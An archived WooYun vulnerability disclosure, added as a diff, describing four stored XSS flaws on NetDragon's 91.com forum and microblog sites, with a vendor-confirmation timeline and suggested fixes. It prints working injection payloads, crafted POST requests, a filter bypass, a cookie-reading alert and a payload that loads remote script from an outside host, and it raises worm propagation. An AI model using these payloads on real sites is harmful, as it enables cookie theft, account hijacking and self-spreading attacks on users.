@@ -1,0 +1,500 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		福建网龙旗下多站存储型Xss礼包  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		福建网龙旗下多站存储型Xss礼包  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-18 00:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-08：	细节向普通白帽子公开<br/>
+									2012-07-18：	细节向实习白帽子公开<br/>
+									2012-08-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">看大家都在发网龙的，什么SQL注入啊，CSRF，我也来凑凑热闹，昨天晚上去翻了翻网龙的XSS，就看了2个社区类型的站，其它站的Xss估计意义也不大。 明天网龙要上班了，我就今天晚上发一发～～<br />
+<br />
+几个XSS寻找难度不大，可以为寻找存储型Xss的新手当教程啦。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 首先是论坛的， 我测试了论坛发帖里的的图片功能。<br />
+<br />
+<br />
+<br />
+首先是正常发送一个图片后，F12打开调试工具，找到刚发的图片。<br />
+<br />
+<br />
+<br />
+&lt;img class=&quot;scrollLoading&quot; onclick=&quot;sjBBS.showImage.show(this);&quot; href=&quot;http://p1.91huo.cn/newbbs91/2012/05/31/1338433258596.jpg&quot; src=&quot;http://p1.91huo.cn/newbbs91/2012/05/31/1338433258596.jpg&quot;&gt;<br />
+<br />
+<br />
+<br />
+可以看到当点击图片的时候，调用了sjBBS.showImage.show<br />
+<br />
+<br />
+<br />
+查看 sjBBS.showImage.show 的代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>var $this = $(obj),<br />
+....<br />
+src = $this.attr(&#039;src&#039;);<br />
+....<br />
+var con = &quot;&lt;img src=&#039;&quot;+ src +&quot;&#039; width=&#039;&quot;+ sw +&quot;&#039; /&gt;&quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+因而，如果我们构造src为 http://image_server/2012/06/16/1339856778551.png#&#039;onload=&#039;alert(/ok/);//aa.png<br />
+<br />
+<br />
+<br />
+就会变成<br />
+<br />
+<br />
+<br />
+&lt;img src=&#039;http://image_server/2012/06/16/1339856778551.png#&#039;onload=&#039;alert(/ok/);//aa.png&#039; width=&#039;100&#039; /&gt;<br />
+<br />
+<br />
+<br />
+这个时候onload里的代码就会被执行了。<br />
+<br />
+<br />
+<br />
+根据以上原理，我们可以发送以下数据。<br />
+<br />
+<br />
+<br />
+POST http://bbs.91.com/modify/42/124/4fc6df44153b79013/p4fdc979dc7930c<br />
+<br />
+<br />
+<br />
+------WebKitFormBoundaryTPxWRJUHf4rt3qZa<br />
+<br />
+Content-Disposition: form-data; name=&quot;wysiwyg&quot;<br />
+<br />
+<br />
+<br />
+1<br />
+<br />
+------WebKitFormBoundaryTPxWRJUHf4rt3qZa<br />
+<br />
+Content-Disposition: form-data; name=&quot;post_body&quot;<br />
+<br />
+<br />
+<br />
+[img]http://image_server/2012/06/16/1339856778551.png#&#039;onload=&#039;alert(/ok/);//aa.png[/img]<br />
+<br />
+------WebKitFormBoundaryTPxWRJUHf4rt3qZa<br />
+<br />
+Content-Disposition: form-data; name=&quot;ubb&quot;<br />
+<br />
+<br />
+<br />
+on<br />
+<br />
+------WebKitFormBoundaryTPxWRJUHf4rt3qZa--<br />
+<br />
+<br />
+<br />
+如果我们把图片上的文字弄为：<br />
+<br />
+<br />
+<br />
+点此看美女！！！！！！！！！！！<br />
+<br />
+<br />
+<br />
+当用户点击的时候，就会中招啦！！<br />
+<br />
+<br />
+<br />
+如图：<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/180000072e3943e11e359f883d8c0f49d1a6143d.jpg" target="_blank"><img src="../images/180000072e3943e11e359f883d8c0f49d1a6143d.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+--------------------------------------------------<br />
+<br />
+<br />
+<br />
+2 . 社区个人资料处存储型Xss，可用作Xss 后门，<br />
+<br />
+<br />
+<br />
+每次用户查看自己用户资料的时候（即进入http://t.91.com/member/UserSettings/的时候），<br />
+<br />
+<br />
+<br />
+都会执行我们的JS代码，或者JS文件。<br />
+<br />
+<br />
+<br />
+由于该后门是t.91.com 域名下的， 可以结合后面所提到的 t.91.com的类微博功能一起。<br />
+<br />
+<br />
+<br />
+这里我就不多介绍了。 缺陷如下： 对uniquename做了过滤，但是没有对nickname过滤。<br />
+<br />
+<br />
+<br />
+至于下面的email, mobile等值，是否过滤了，我没去看，如果没过滤，请一起过滤！<br />
+<br />
+<br />
+<br />
+http://t.91.com/member/Ajax_Profile<br />
+<br />
+<br />
+<br />
+uniquename	bdhxxxxxxxxyyy<br />
+<br />
+old_uniquename	游客293464167221304<br />
+<br />
+nickname	aaaavv&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;<br />
+<br />
+nickname_hidden	游客293464167221304<br />
+<br />
+realname	李明<br />
+<br />
+sex	0<br />
+<br />
+birth_year	0<br />
+<br />
+birth_month	0<br />
+<br />
+birth_day	1<br />
+<br />
+birthprovince	0<br />
+<br />
+birthcity	0<br />
+<br />
+resideprovince	510000<br />
+<br />
+residecity	510100<br />
+<br />
+resideprovince_hidden	四川省<br />
+<br />
+residecity_hidden	成都市<br />
+<br />
+email<br />
+<br />
+mobile<br />
+<br />
+homepage<br />
+<br />
+interest<br />
+<br />
+introduction<br />
+<br />
+<br />
+<br />
+漏洞效果，如下图：<br />
+<br />
+<br />
+<br />
+每次用户进入个人资料页面，就会触发我们的JS代码，同时，我们可以劫持【保存按钮】，使得每次用户每次修改个人资料的时候，都会带上我们的恶意代码，从而形成长久劫持。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1800010596285c0bc314dbfe714aa8017ce1325a.jpg" target="_blank"><img src="../images/1800010596285c0bc314dbfe714aa8017ce1325a.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+--------------------------------------------------<br />
+<br />
+<br />
+<br />
+3. 微博发图片功能 XSS<br />
+<br />
+<br />
+<br />
+这个漏洞的原因太简单，也不多说，图片字段upimg，没有过滤双引号。 导致可以直接添加onload属性，运行代码。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>POST http://t.91.com/broadcast/add<br />
+<br />
+tid<br />
+content	aaaaaaaaaaaaaaaa<br />
+secret	0<br />
+video<br />
+upimg	http://p2.91huo.cn/t91/broadcast/c7/2d/91/c72d9149f543841f5ce0175f1f96cc1e.small.png&quot;onload=&quot;alert(document.cookie);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+上面的upimg是我们构造好的参数。<br />
+<br />
+<br />
+<br />
+当我们发布一条微博之后，关注我们的用户，将会被XSS， 这个可以做成蠕虫。<br />
+<br />
+<br />
+<br />
+即： 看到这条微博的用户，将会自动发送一条带有XSS的微博信息，几何级传播，会在整个t.qq.com迅速蔓延。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/18000120ecbf50d86c856956bd03831ad9baa513.jpg" target="_blank"><img src="../images/18000120ecbf50d86c856956bd03831ad9baa513.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+打开调试工具，看看我们注入的代码。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1800013014b044d6a7947309c4f25686f2d81673.jpg" target="_blank"><img src="../images/1800013014b044d6a7947309c4f25686f2d81673.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+--------------------------------------------------<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+4. 微博发链接功能Xss<br />
+<br />
+<br />
+<br />
+还是微博的，链接处，经过精心构造，一样可以执行我们的恶意JS代码，造成微博蠕虫。<br />
+<br />
+<br />
+<br />
+缺陷如下： [url:地址]XXXX[/url] 这个UBB标签在输出时，存在问题，导致XSS。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://t.91.com/broadcast/add<br />
+<br />
+tid<br />
+content	#null#[url:http://www.baidu.com&amp;lt;img/src=&amp;quot;1&amp;quot;onerror=&amp;quot;alert&amp;#x28;/xxxxxx/)&amp;quot;&amp;gt;]aaaaaaaa[/url]<br />
+secret	0<br />
+video<br />
+upimg</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这样遇到一个有点意思的情况。<br />
+<br />
+<br />
+<br />
+A. 代码里，不能出现() ，<br />
+<br />
+B. 如果我们用，&amp;#28; &amp;#29; 来表示()的时候， &amp;#28; &amp;#29; 里的 #...# 会被认为是微博话题，#话题# ...<br />
+<br />
+<br />
+<br />
+因而这里我用 &amp;#x28;..) 来绕过这个限制。<br />
+<br />
+<br />
+<br />
+将content构造为以下的代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>#null#[url:http://www.baidu.com&amp;lt;img/src=&amp;quot;1&amp;quot;onerror=&amp;quot;jQuery.getScript&amp;#x28;&#039;//xsst.sinaapp.com/m.js&#039;)&amp;quot;&amp;gt;]aaaaaaaa</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1800014506d4bbe643c47a12efe72d448d3065f3.jpg" target="_blank"><img src="../images/1800014506d4bbe643c47a12efe72d448d3065f3.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+同样打开调试工具，查看<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1800015533123db884d7886088020535489bbb2e.jpg" target="_blank"><img src="../images/1800015533123db884d7886088020535489bbb2e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明就行。<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 第一处Xss，修改sjBBS.showImage.show函数。<br />
+<br />
+<br />
+<br />
+将var con = &quot;&lt;img src=&#039;&quot;+ src +&quot;&#039; width=&#039;&quot;+ sw +&quot;&#039; /&gt;&quot;<br />
+<br />
+<br />
+<br />
+修改为 <br />
+<br />
+<br />
+<br />
+</p><pre><code>function filterfunc(str){<br />
+   return str.replace(/&amp;/g,&quot;&amp;amp;&quot;).replace(/&#039;/g,&quot;&amp;#x27;&quot;).replace(/\\/g,&quot;&amp;#x5c;&quot;);<br />
+}<br />
+<br />
+var con = &quot;&lt;img src=&#039;&quot;+ filterfunc(src) +&quot;&#039; width=&#039;&quot;+ sw +&quot;&#039; /&gt;&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2. 这一处是常规的输入输出，输出nickname时过滤 &lt;&gt;， 个人资料里如果其它字段未过滤，同理。<br />
+<br />
+<br />
+<br />
+3. 过滤upimg里的&quot;,&gt;,\,等符号，将&amp;替换为 &amp;amp;<br />
+<br />
+<br />
+<br />
+4. 这个我只是加入测试内容后，根据输出来构造利用代码的，不知道你们服务器端是个什么处理逻辑。。乱乱的，看着办吧！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08413" title="福建网龙旗下多站存储型Xss礼包">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-06-18 10:19</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢gainover提交的漏洞</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8413";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
